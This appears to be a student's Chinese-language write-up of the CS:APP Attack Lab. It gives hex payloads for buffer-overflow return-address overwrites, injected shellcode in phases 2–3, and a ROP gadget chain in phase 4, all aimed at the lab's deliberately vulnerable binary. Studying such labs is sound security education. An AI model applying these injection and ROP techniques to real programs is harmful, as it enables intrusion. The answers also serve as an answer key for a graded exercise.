跟着pdf慢慢来
# phase 1
发现栈大小是0x28，touch1地址是0x004017c0，直接拿字符串怼过去，把地址塞进栈里原来的返回地址
```
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
c0 17 40 00 00 00 00 00
```
然后存进ans.txt，再cat ans.txt | ./hex2raw | ./ctarget -q即可
# phase 2
跟着https://github.com/Exely/CSAPP-Labs/blob/master/notes/attack.md来的
答案：
```
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 
78 dc 61 55 00 00 00 00
```
# phase 3
和phase 2大同小异
```
48 c7 c7 b0 dc 61 55
68 fa 18 40 00   
c3 
51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 
78 dc 61 55 00 00 00 00
```
# phase 4
不会，看别人的：


这题要求在新的保护下重复第二题的结果，将 `cookie` 值传入 `%rdi` ，这里和第二题一样使得栈溢出，然后将返回地址设为 `gadgets` 攻击链的起始地址。攻击链可以这样构造，观察代码发现：

```
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq
```

查阅文档， `58 90` 即是 `popq %rax` ，`90` 是 `nop` ，可以直接忽视，这段代码地址是 `0x4019ab` ，它将栈上的值存入了寄存器，接着发现：

```
00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:       c3
```

查阅文档， `48 89 c7` 就是 `movq %rax,%rdi` ，就将栈上的值存入了 `%rdi` ，因此将 `cookie` 值存入栈中，就可以传值，这段代码地址是 `0x4019a2` 。    
因此输入字符串先是一段填充的 40 字节，然后是跳转地址，设为 pop 的地址 `0x4019ab` ，接着存入 `cookie` 值（就是将要 pop 的那个值，注意应存入 64 位值），然后是 mov 的地址 `0x4019a2` ，最后跳转到 `touch2` ，这样一个完整的 ROP 攻击链就形成了，一个可行的答案就是：

```
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```